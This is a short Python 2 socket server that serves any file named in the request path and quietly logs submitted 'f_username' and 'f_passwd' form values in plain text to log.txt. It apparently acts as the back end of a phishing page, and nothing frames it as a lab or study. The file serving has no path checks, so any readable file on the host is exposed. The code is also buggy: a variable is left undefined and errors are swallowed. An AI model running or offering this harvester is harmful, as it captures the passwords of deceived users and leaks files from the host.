import socket
import re
import sys

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Bind the socket to the port
port=int(sys.argv[1])
server_address=('localhost', port)
print >>sys.stderr, 'starting up on %s port %s' % server_address
sock.bind(server_address)
# Listen for incoming connections
sock.listen(1)

while True:
    # Wait for a connection`
    print >>sys.stderr, 'waiting for a connection'
    connection, client_address = sock.accept()
    try:
        print >>sys.stderr, 'connection from', client_address

        # Receive the data in small chunks and retransmit it
        #  while True:
        data = connection.recv(1024)
        match=re.search(r'GET\s/(\S+)',data)
        user=re.findall(r"f_username=(\w+)&f_passwd=(\w+)",data)
        if match:
         filename=match.group(1)
         # to read header re.findall(r"(?P<name>.*?): (?P<value>.*?)\r\n", data)
        if user:
              f=open("log.txt","a")
              f.write(("\nusername:%s")%str(user[0][0]))
              f.write(("\npassword:%s\n")%str(user[0][1]))
              f.close()
     
        print >>sys.stderr, 'received "%s"' % data
        if filename and  filename!="favicon.ico" :
             print >>sys.stderr, 'sending data back to the client'
             try:
               f=open (filename, "rb") 
               l = f.read()
               connection.send('HTTP/1.0 200 OK \r\n')
               connection.send('Content-Type: text/html\r\n\r\n')
               connection.send(l)
 
             except : 
                   connection.sendall("404 page not found");
                 
    finally:
        #Clean up the connection
          connection.close()


